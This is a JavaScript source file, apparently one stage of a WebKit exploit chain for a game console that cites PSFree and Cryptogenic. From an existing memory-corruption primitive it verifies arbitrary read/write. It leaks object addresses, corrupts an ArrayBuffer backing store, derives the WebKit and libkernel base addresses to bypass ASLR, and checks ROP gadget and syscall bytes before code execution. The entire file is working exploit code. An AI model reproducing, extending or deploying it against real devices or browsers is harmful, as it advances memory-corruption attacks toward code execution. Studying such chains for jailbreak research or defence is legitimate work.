/**
 * Verbose arbitrary R/W proof — JS primitive only (no native pivot / getpid).
 * Mirrors what PSFree / Cryptogenic establish before code execution.
 */
import { int64 } from "./int64.js";
import { carrierHeaderCopy } from "./core.js?v=9";

const ELF_MAGIC = 0x464c457f;

function read1p(p, addr) {
    try { return p.read1(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    try { return p.read4(addr); } catch (_) { return null; }
}

function read8p(p, addr) {
    try { return p.read8(addr); } catch (_) { return null; }
}

function same64(a, b) {
    return a && b && a.low === b.low && a.hi === b.hi;
}

function fmtHex32(v) {
    if (v == null) return "null";
    return "0x" + (v >>> 0).toString(16).padStart(8, "0");
}

function fmtAddr(a) {
    if (!a) return "null";
    return String(a);
}

function dumpBytes(p, addr, n) {
    const parts = [];
    for (let i = 0; i < n; i++) {
        const b = read1p(p, addr.add32(i));
        parts.push(b == null ? "??" : (b & 0xff).toString(16).padStart(2, "0"));
    }
    return parts.join(" ");
}

function checkGadgetBytes(p, base, rva, pat) {
    if (rva == null || !base) return false;
    const a = base.add32(rva);
    for (let i = 0; i < pat.length; i++) {
        if (pat[i] === null) continue;
        if (read1p(p, a.add32(i)) !== pat[i]) return false;
    }
    return true;
}

function alignModuleBase(addr) {
    if (!addr) return null;
    return new int64(addr.low & ~0x3fff, addr.hi);
}

function plausibleModuleBase(addr) {
    if (!addr) return false;
    if (addr.hi < 0x80) return false;
    if ((addr.low & 0x3fff) !== 0) return false;
    return true;
}

function leakNativeFn(p, off, fn, label) {
    const fnOff = off.wk_JSFunction_m_function != null ? off.wk_JSFunction_m_function : 0x28;
    const cell = p.leakval(fn);
    const mid = read8p(p, cell.add32(0x18));
    const nativeFn = mid ? read8p(p, mid.add32(fnOff)) : null;
    return { label, fn, cell, jsFunction: mid, nativeFn };
}

function parseSessionAddr(raw) {
    if (!raw) return null;
    let s = String(raw).trim().replace(/^0x/i, "");
    if (!s || !/^[0-9a-f]+$/i.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
    if (s.length < 16) s = s.padStart(16, "0");
    return new int64(parseInt(s.slice(-8), 16) >>> 0, parseInt(s.slice(0, -8), 16) >>> 0);
}

function sessionAddr(key) {
    try { return parseSessionAddr(sessionStorage.getItem(key)); } catch (_) { return null; }
}

/**
 * @param {{ log: function, readPrimitivePass?: boolean, pairStatus?: object,
 *           probeModules?: boolean, verboseLeak?: boolean,
 *           lk2eOk?: boolean, sessionWebkit?: object, sessionLk?: object }} ctx
 */
export function runArwProofVerbose(p, off, carrier, ctx) {
    ctx = ctx || {};
    const log = ctx.log || (() => {});
    const verboseLeak = ctx.verboseLeak === true;
    const probeModules = ctx.probeModules === true;
    const lk2eOk = ctx.lk2eOk === true;
    const addresses = [];
    const results = {
        readPrimitivePass: !!ctx.readPrimitivePass,
        distinctLeak: false,
        headerRoundtrip: false,
        arrayBufferRead: false,
        arrayBufferWrite: false,
        webkitVerified: false,
        libkernelVerified: false,
        webkitFrom2e: false,
        lkFrom2e: false,
    };

    function record(label, addr, note) {
        addresses.push({ label, addr: fmtAddr(addr), note: note || "" });
    }

    function step(phase, tag, detail) {
        log("[" + phase + "] " + tag, detail || "");
    }

    function pass(phase, tag, detail) {
        log("[" + phase + "] PASS", tag + (detail ? "  " + detail : ""));
    }

    function fail(phase, tag, detail) {
        log("[" + phase + "] FAIL", tag + (detail ? "  " + detail : ""));
    }

    function warn(phase, tag, detail) {
        log("[" + phase + "] WARN", tag + (detail ? "  " + detail : ""));
    }

    step("INIT", "PROOF-BEGIN", "verbose arbitrary R/W verification (no syscalls)");

    if (!results.readPrimitivePass)
        fail("INIT", "READ-PRIMITIVE-PASS", "not seen during establishPrimitive");
    else
        pass("INIT", "READ-PRIMITIVE-PASS", "dummykit-core carrier validated");

    step("CARRIER", "ANCHORS", "exploit-controlled objects from core.js");
    if (carrier) {
        const fields = [
            ["hostAddress", carrier.hostAddress, "fake String host"],
            ["fakeAddress", carrier.fakeAddress, "fake cell"],
            ["holderAddress", carrier.holderAddress, "target holder"],
            ["textareaAddress", carrier.textareaAddress, "anchor textarea"],
            ["anchorObjectAddress", carrier.anchorObjectAddress, "marker A"],
            ["leakSlotAddress", carrier.leakSlotAddress, "holder leak slot"],
        ];
        for (let i = 0; i < fields.length; i++) {
            const [name, val, note] = fields[i];
            if (val != null) {
                record("carrier." + name, val, note);
                step("CARRIER", name, fmtAddr(val) + "  (" + note + ")");
            }
        }
        if (carrier.native) {
            const nat = carrier.native;
            const natFields = [
                ["targetCell", nat.targetCell, "parseInt pivot cell"],
                ["executable", nat.executable, "NativeExecutable"],
                ["nativeFn", nat.nativeFn, "parseInt code ptr"],
                ["textareaCell", nat.textareaCell, "textarea cell"],
                ["holderCell", nat.holderCell, "holder cell"],
            ];
            for (let i = 0; i < natFields.length; i++) {
                const [name, val, note] = natFields[i];
                if (val != null) {
                    record("native." + name, val, note);
                    step("CARRIER", "native." + name, fmtAddr(val) + "  (" + note + ")");
                }
            }
        }
        try {
            const hdr = carrierHeaderCopy();
            if (hdr && hdr.length) {
                const hex = Array.from(hdr.slice(0, 0x30))
                    .map(b => (b & 0xff).toString(16).padStart(2, "0")).join(" ");
                step("CARRIER", "RW-HEADER-HEX", hex);
            }
        } catch (_) { }
        if (typeof carrier.assertHome === "function") {
            const home = carrier.assertHome();
            step("CARRIER", "assertHome", home ? "carrier still at home vector" : "home check failed");
        }
    }

    if (ctx.pairStatus) {
        const ps = ctx.pairStatus;
        step("PAIR", "STATUS", "state=" + ps.state + " stage=" + (ps.stage || "?")
            + " promoted=" + !!ps.promoted);
        if (ps.mainAddress) step("PAIR", "mainAddress", fmtAddr(ps.mainAddress));
        if (ps.workerAddress) step("PAIR", "workerAddress", fmtAddr(ps.workerAddress));
        if (ps.mainVector) step("PAIR", "mainVector", fmtAddr(ps.mainVector));
        if (ps.workerVector) step("PAIR", "workerVector", fmtAddr(ps.workerVector));
    }

    step("LEAK", "BEGIN", "leakval anchors + proof boxes"
        + (verboseLeak ? " (full dumps)" : " (lite — ?verbose=1 for dumps)"));
    const leakTargets = [
        ["parseInt", parseInt],
        ["parseFloat", parseFloat],
        ["boxA", { tag: "arwA", n: 1 }],
        ["boxB", { tag: "arwB", n: 2 }],
    ];
    if (verboseLeak) {
        leakTargets.push(["Object", Object], ["Array", Array], ["Math.expm1", Math.expm1]);
        leakTargets.push(["boxC", { tag: "arwC", n: 3 }]);
    }
    if (carrier && carrier.textarea) leakTargets.push(["textarea", carrier.textarea]);
    if (carrier && carrier.anchorObject) leakTargets.push(["anchorObject", carrier.anchorObject]);

    const leaked = [];
    for (let i = 0; i < leakTargets.length; i++) {
        const [label, obj] = leakTargets[i];
        try {
            const cell = p.leakval(obj);
            record("leak." + label, cell, "leakval");
            step("LEAK", label + ".cell", fmtAddr(cell));
            const hdr = read8p(p, cell);
            if (hdr) {
                step("LEAK", label + ".header", fmtAddr(hdr));
                if (verboseLeak)
                    step("LEAK", label + ".dump", dumpBytes(p, cell, 0x30));
            }
            if (verboseLeak) {
                for (const [off, tag] of [[0x8, "butterfly"], [0x10, "+0x10"], [0x18, "+0x18"]]) {
                    const q = read8p(p, cell.add32(off));
                    if (q && (q.low !== 0 || q.hi !== 0)) {
                        record("leak." + label + "." + tag, q, "cell+0x" + off.toString(16));
                        step("LEAK", label + "." + tag, fmtAddr(q));
                    }
                }
            }
            leaked.push({ label, obj, cell });
        } catch (e) {
            fail("LEAK", label, e.message || String(e));
        }
    }

    step("RW-TEST", "DISTINCT-LEAK", "two JSObject cells must differ");
    const boxA = leaked.find(x => x.label === "boxA");
    const boxB = leaked.find(x => x.label === "boxB");
    if (boxA && boxB && !same64(boxA.cell, boxB.cell) && boxA.cell.low !== 0) {
        results.distinctLeak = true;
        pass("RW-TEST", "DISTINCT-LEAK", "A=" + fmtAddr(boxA.cell) + " B=" + fmtAddr(boxB.cell));
    } else {
        fail("RW-TEST", "DISTINCT-LEAK", "A=" + fmtAddr(boxA && boxA.cell)
            + " B=" + fmtAddr(boxB && boxB.cell));
    }

    step("RW-TEST", "HEADER-ROUNDTRIP", "read8 → write8 → read8 on boxA header");
    if (boxA && boxA.cell) {
        const hdr = read8p(p, boxA.cell);
        if (hdr) {
            step("RW-TEST", "header-before", fmtAddr(hdr));
            p.write8(boxA.cell, hdr);
            const hdr2 = read8p(p, boxA.cell);
            if (same64(hdr, hdr2)) {
                results.headerRoundtrip = true;
                pass("RW-TEST", "HEADER-ROUNDTRIP", fmtAddr(hdr));
            } else {
                fail("RW-TEST", "HEADER-ROUNDTRIP", "before=" + fmtAddr(hdr)
                    + " after=" + fmtAddr(hdr2));
            }
        } else {
            fail("RW-TEST", "HEADER-ROUNDTRIP", "read8 header null");
        }
    }

    step("RW-TEST", "ARRAYBUFFER", "corrupt backing store — PSFree-style magic write");
    const probe = new ArrayBuffer(0x20);
    const view = new Uint32Array(probe);
    view[0] = 0xcafebabe;
    view[1] = 0xdeadbeef;
    const abCell = p.leakval(probe);
    record("probe.ArrayBuffer.cell", abCell, "leakval");
    step("RW-TEST", "ArrayBuffer.cell", fmtAddr(abCell));
    const implOff = off.wk_ArrayBuffer_m_impl != null ? off.wk_ArrayBuffer_m_impl : 0x10;
    const dataOff = off.wk_ArrayBuffer_m_contents_m_data != null
        ? off.wk_ArrayBuffer_m_contents_m_data : 0x10;
    const impl = read8p(p, abCell.add32(implOff));
    if (impl) {
        record("probe.ArrayBuffer.impl", impl, "+0x" + implOff.toString(16));
        step("RW-TEST", "ArrayBuffer.impl", fmtAddr(impl));
        const data = read8p(p, impl.add32(dataOff));
        if (data) {
            record("probe.ArrayBuffer.backing", data, "m_contents.m_data");
            step("RW-TEST", "backing-ptr", fmtAddr(data));
            const got = read4p(p, data);
            step("RW-TEST", "read4-backing", "got=" + fmtHex32(got) + " expect=0xcafebabe");
            if (got === 0xcafebabe) {
                results.arrayBufferRead = true;
                pass("RW-TEST", "ARRAYBUFFER-READ", fmtHex32(got));
                p.write4(data, new int64(0x600dbabe, 0));
                step("RW-TEST", "write4-backing", "wrote 0x600dbabe");
                if (view[0] === 0x600dbabe) {
                    results.arrayBufferWrite = true;
                    pass("RW-TEST", "ARRAYBUFFER-WRITE", "JS view[0]=0x600dbabe");
                    p.write4(data, new int64(0xcafebabe, 0));
                    step("RW-TEST", "restore", "backing restored to 0xcafebabe");
                } else {
                    fail("RW-TEST", "ARRAYBUFFER-WRITE",
                        "JS view still " + fmtHex32(view[0] >>> 0));
                }
            } else {
                fail("RW-TEST", "ARRAYBUFFER-READ", "expected 0xcafebabe got " + fmtHex32(got));
            }
        } else {
            fail("RW-TEST", "ARRAYBUFFER", "backing ptr null @ impl+0x" + dataOff.toString(16));
        }
    } else {
        fail("RW-TEST", "ARRAYBUFFER", "impl null @ cell+0x" + implOff.toString(16));
    }

    const rwCoreOk = results.readPrimitivePass
        && results.distinctLeak
        && results.headerRoundtrip
        && results.arrayBufferRead
        && results.arrayBufferWrite;
    if (rwCoreOk)
        pass("RW-TEST", "CORE-OK", "heap R/W tests passed — module probes optional below");

    step("NATIVE", "BEGIN", "parseInt native ptr (from carrier or leak)");
    let piNative = null;
    if (carrier && carrier.native && carrier.native.nativeFn != null) {
        const nf = carrier.native.nativeFn;
        piNative = typeof nf === "object" && nf.low != null ? nf : null;
        if (!piNative && typeof nf === "number" && nf > 0)
            piNative = new int64(nf >>> 0, Math.floor(nf / 0x100000000));
        if (piNative) {
            record("native.parseInt.code", piNative, "carrier.native");
            step("NATIVE", "parseInt.code", fmtAddr(piNative) + "  (carrier snapshot)");
        }
    }
    if (!piNative) {
        const pi = leakNativeFn(p, off, parseInt, "parseInt");
        piNative = pi.nativeFn;
        if (pi.nativeFn) {
            step("NATIVE", "parseInt.code", fmtAddr(pi.nativeFn) + "  first4="
                + fmtHex32(read4p(p, pi.nativeFn)));
        }
    }
    if (piNative && verboseLeak)
        step("NATIVE", "parseInt.prologue", dumpBytes(p, piNative, 16));
    if (piNative)
        try { sessionStorage.setItem("wk-nativeFn", String(piNative)); } catch (_) { }

    let webkitBase = ctx.sessionWebkit || sessionAddr("wk-webkitBase");
    let libkernelBase = ctx.sessionLk || sessionAddr("wk-libkernelBase");

    step("MODULES", "BEGIN", "session wb=" + fmtAddr(webkitBase)
        + " lk=" + fmtAddr(libkernelBase)
        + " 2e=" + (lk2eOk ? "ok" : "miss")
        + " probe=" + (probeModules ? "on" : "off"));

    if (webkitBase) {
        results.webkitFrom2e = true;
        record("webkitBase.session", webkitBase, "2e or persistWebkitBasesLight");
        pass("WEBKIT", "SESSION", fmtAddr(webkitBase) + "  (already have base — not re-derived)");
        if (probeModules) {
            const magic = read4p(p, webkitBase);
            step("WEBKIT", "ELF-PEEK", "magic=" + fmtHex32(magic)
                + (magic === ELF_MAGIC ? "  (ELF OK)" : ""));
            if (magic === ELF_MAGIC) {
                results.webkitVerified = true;
                pass("WEBKIT", "ELF-OK", "@ session base");
            } else if (off.wk_POP_RDI_RET != null
                && checkGadgetBytes(p, webkitBase, off.wk_POP_RDI_RET, [0x5f, 0xc3])) {
                results.webkitVerified = true;
                pass("WEBKIT", "POP_RDI-OK", "@+" + off.wk_POP_RDI_RET.toString(16));
            } else {
                warn("WEBKIT", "ELF-MISS", "peek failed @ session base — 2e base still used, not re-guessed");
            }
        } else {
            results.webkitVerified = true;
            step("WEBKIT", "TRUST-2E", "modules off — using session webkit (no ELF peek)");
        }
    } else if (probeModules && piNative) {
        const parseIntOff = off.wk_parseint_native != null ? off.wk_parseint_native : off.wk_expm1_builtin;
        if (parseIntOff != null) {
            webkitBase = alignModuleBase(piNative.sub32(parseIntOff));
            step("WEBKIT", "DERIVE", fmtAddr(webkitBase) + "  (no session — native - 0x"
                + parseIntOff.toString(16) + ")");
            if (plausibleModuleBase(webkitBase)) {
                const magic = read4p(p, webkitBase);
                if (magic === ELF_MAGIC
                    || (off.wk_POP_RDI_RET != null
                        && checkGadgetBytes(p, webkitBase, off.wk_POP_RDI_RET, [0x5f, 0xc3]))) {
                    results.webkitVerified = true;
                    pass("WEBKIT", "DERIVED-OK", fmtAddr(webkitBase));
                    try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
                } else {
                    warn("WEBKIT", "DERIVE-FAIL", "ELF/gadget miss on derived base");
                    webkitBase = null;
                }
            }
        }
    } else {
        step("WEBKIT", "NONE", "no session webkit — run 2e first or ?modules=1 with native fn");
    }

    if (libkernelBase || lk2eOk) {
        results.lkFrom2e = !!(libkernelBase || lk2eOk);
        if (libkernelBase) {
            record("libkernelBase.session", libkernelBase, "2e Leak+lk vote");
            pass("LIBKERNEL", "SESSION", fmtAddr(libkernelBase) + "  (from 2e — not IAT re-probe)");
        } else {
            pass("LIBKERNEL", "2E-FLAG", "2e reported ok but lk not in session — check LK-OK line");
        }
        if (probeModules && libkernelBase) {
            const w0 = read4p(p, libkernelBase);
            const w1 = read4p(p, libkernelBase.add32(4));
            step("LIBKERNEL", "PROLOGUE-PEEK", "w0=" + fmtHex32(w0) + " w1=" + fmtHex32(w1));
            if (w1 != null && (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f) {
                results.libkernelVerified = true;
                pass("LIBKERNEL", "PROLOGUE-OK", "direct @ session lk");
            } else {
                results.libkernelVerified = lk2eOk;
                if (lk2eOk)
                    warn("LIBKERNEL", "PROLOGUE-MISS", "2e lk trusted anyway (no 13.50 IAT path)");
                else
                    warn("LIBKERNEL", "PROLOGUE-MISS", "prologue unexpected @ session lk");
            }
        } else {
            results.libkernelVerified = lk2eOk || !!libkernelBase;
            step("LIBKERNEL", "TRUST-2E", "using 2e vote — no extra reads"
                + (probeModules ? "" : " (?modules=1 adds prologue peek only)"));
        }
    } else if (probeModules) {
        warn("LIBKERNEL", "NONE", "no session lk — 2e miss; R/W proof does not need lk");
    } else {
        step("LIBKERNEL", "NONE", "2e miss — heap R/W proof unaffected");
    }

    if (probeModules && webkitBase && results.webkitVerified) {
        step("RW-TEST", "ARBITRARY-READ", "ELF bytes @ session/verified webkit base");
        step("RW-TEST", "webkit-bytes", dumpBytes(p, webkitBase, 16));
    }

    const rwOk = rwCoreOk;

    const wbSummary = results.webkitVerified ? "verified"
        : (results.webkitFrom2e ? "session" : "none");
    const lkSummary = results.libkernelVerified ? "verified"
        : (results.lkFrom2e ? "2e-session" : "none");

    step("SUMMARY", "CHECKLIST",
        "primitive=" + results.readPrimitivePass
        + " distinct=" + results.distinctLeak
        + " header=" + results.headerRoundtrip
        + " ab-read=" + results.arrayBufferRead
        + " ab-write=" + results.arrayBufferWrite
        + " webkit=" + wbSummary
        + " lk=" + lkSummary);
    if (webkitBase)
        step("SUMMARY", "WEBKIT-BASE", fmtAddr(webkitBase));
    if (libkernelBase)
        step("SUMMARY", "LIBKERNEL-BASE", fmtAddr(libkernelBase));
    step("SUMMARY", "ADDRESSES", addresses.length + " recorded (see LEAK/CARRIER lines above)");

    if (rwOk) {
        log("FINAL", "════════════════════════════════════════");
        log("FINAL", "  arbitrary r/w achieved");
        log("FINAL", "════════════════════════════════════════");
    } else {
        log("FINAL", "════════════════════════════════════════");
        log("FINAL", "  arbitrary r/w NOT achieved — see FAIL lines");
        log("FINAL", "════════════════════════════════════════");
    }

    return {
        ok: rwOk,
        results,
        addresses,
        webkitBase,
    };
}
